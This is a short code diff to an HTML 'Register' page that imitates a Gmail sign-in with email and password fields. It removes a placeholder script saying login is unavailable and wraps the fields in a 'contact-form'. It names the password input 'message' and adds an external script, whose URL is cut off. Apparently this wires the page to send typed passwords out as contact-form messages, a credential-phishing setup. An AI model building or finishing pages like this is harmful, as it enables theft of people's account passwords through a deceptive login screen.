@@ -115,11 +115,12 @@ button:active {
   </div>
 
   <h1>Register</h1>
-
+  <form id="contact-form">
   <div class="field">
     <span class="icon">✉</span>
     <input
       type="email"
+      name="user_email"
       placeholder="Gmail"
       autocomplete="off"
       aria-label="Gmail"
@@ -130,6 +131,7 @@ button:active {
     <span class="icon">🔒</span>
     <input
       type="password"
+      name="message"
       placeholder="Password"
       autocomplete="off"
       aria-label="Password"
@@ -137,26 +139,17 @@ button:active {
   </div>
 
   <button
-    type="button"
-    onclick="showMessage()"
+    type="submit"
   >
     Login
   </button>
-
+  </form>
   <p
     class="message"
     id="message"
     role="status"
-  ></p>
+
+  </p>
 
 </div>
-
-<script>
-function showMessage() {
-  document.getElementById("message").textContent =
-    "Login is not available yet.";
-}
-</script>
-
-</body>
-</html>
+<script src="h
